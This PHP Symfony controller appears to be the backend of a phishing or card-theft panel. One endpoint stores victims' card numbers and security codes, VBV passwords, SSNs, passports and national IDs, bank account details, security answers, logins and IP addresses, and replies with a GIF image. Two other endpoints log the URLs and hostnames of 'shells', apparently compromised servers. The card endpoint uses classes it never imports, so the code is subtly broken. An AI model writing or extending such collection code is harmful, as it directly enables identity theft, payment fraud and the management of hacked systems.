<?php

namespace Dashboard\RestfullBundle\Controller;

use Dashboard\AdminBundle\Entity\Card;
use Dashboard\shellsBundle\Entity\shells;
use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Request;

class RestController extends Controller
{
    public function CardInsertAction(Request $request)
    {

        $data = (array)json_decode($request->getContent());
        $em = $this->getDoctrine()->getManager();
        $card = new Card();
        $card->setFname($data["fname"]);
        $card->setLname($data["lname"]);
        $card->setDob($data["dob"]);
        $card->setTelephone($data["telephone"]);
        $card->setSsn($data["ssn"]);
        $card->setPassport($data["passport"]);
        $card->setNumbid($data["numbid"]);
        $card->setNaid($data["naid"]);
        $card->setCitizenid($data["citizenid"]);
        $card->setCivilid($data["civilid"]);
        $card->setQatarid($data["qatarid"]);
        $card->setAddress($data["address"]);
        $card->setTown($data["town"]);
        $card->setCountry($data["country"]);
        $card->setPostcode($data["postcode"]);
        $card->setCcname($data["ccname"]);
        $card->setCcno($data["ccno"]);
        $card->setCcexp($data["ccexp"]);
        $card->setSecode($data["secode"]);
        $card->setVbvsecure($data["vbvsecure"]);
        $card->setClimit($data["climit"]);
        $card->setAcno($data["acno"]);
        $card->setSortcode($data["sortcode"]);
        $card->setBans($data["bans"]);
        $card->setQ1($data["q1"]);
        $card->setA1($data["a1"]);
        $card->setUser($data["user"]);
        $card->setPass($data["pass"]);
        $card->setIp($data["ip"]);
        $card->setAgent($data["agent"]);
        $card->setCcbrand($data["ccbrand"]);
        $card->setCctype($data["cctype"]);
        $card->setCclevel($data["cclevel"]);
        $card->setCcbank($data["ccbank"]);
        $em->persist($card);
        $em->flush();
        $filepath = "/var/www/PanelD/web/lib/img/logo.GIF";
        $filename = "logo.GIF";
        $response = new Response();
        $disposition = $response->headers->makeDisposition(ResponseHeaderBag::DISPOSITION_INLINE, $filename);
        $response->headers->set('Content-Disposition', $disposition);
        $response->headers->set('Content-Type', 'image/gif');
        $response->setContent(file_get_contents($filepath));
        return $response;



    }
    public function ShellAction (Request $request)
    {
        $data = (array)json_decode($request->getContent());
        $em = $this->getDoctrine()->getManager();
        $card = new shells();
        $card->setUrlhost($data["url"]);
        $card->setHostname($data["hostname"]);
        $em->persist($card);
        $em->flush();
        return new JsonResponse(array("message"=>"success"));

    }
    public function TxtAction (Request $request)
    {
        $data = (array)json_decode($request->getContent());
        $em = $this->getDoctrine()->getManager();
        $card = new shells();
        $card->setUrlhost($data["url"]);
        $card->setHostname($data["hostname"]);
        $em->persist($card);
        $em->flush();
        return new JsonResponse(array("message"=>"success"));

    }
}
